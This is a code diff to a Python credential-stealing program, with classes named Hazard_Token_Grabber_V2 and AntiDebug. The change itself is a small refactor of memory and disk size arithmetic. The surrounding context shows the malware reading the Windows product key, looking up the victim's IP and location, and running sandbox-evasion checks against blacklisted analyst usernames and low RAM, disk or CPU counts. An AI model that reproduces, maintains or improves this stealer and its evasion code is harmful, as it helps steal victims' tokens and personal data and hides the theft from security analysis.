@@ -488,8 +488,8 @@ class Hazard_Token_Grabber_V2(functions):
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
-        ram = str(psutil.virtual_memory()[0]/1024/1024/1024).split(".")[0]
-        disk = str(psutil.disk_usage('/')[0]/1024/1024/1024).split(".")[0]
+        ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
+        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
         # ip, country, city, region, googlemap = "None"
         data = httpx.get("https://ipinfo.io/json").json()
         ip = data.get('ip').replace(" ", "᠎ ")
@@ -585,7 +585,6 @@ class AntiDebug(functions):
     inVM = False
 
     def __init__(self):
-        self.running = True
         self.processes = list()
 
         self.blackListedUsers = ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
@@ -606,7 +605,6 @@ class AntiDebug(functions):
                 continue
 
     def programExit(self):
-        self.running = False
         self.__class__.inVM = True
 
     def programKill(self, proc):
@@ -638,10 +636,10 @@ class AntiDebug(functions):
                 self.programExit()
 
     def specsCheck(self):
-        ram = str(psutil.virtual_memory()[0]/1024/1024/1024).split(".")[0]
+        ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
         if int(ram) <= 3:  # 3gb or less ram
             self.programExit()
-        disk = str(psutil.disk_usage('/')[0]/1024/1024/1024).split(".")[0]
+        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
         if int(disk) <= 50:  # 50gb or less disc space
             self.programExit()
         if int(psutil.cpu_count()) <= 1:  # 1 or less cpu cores
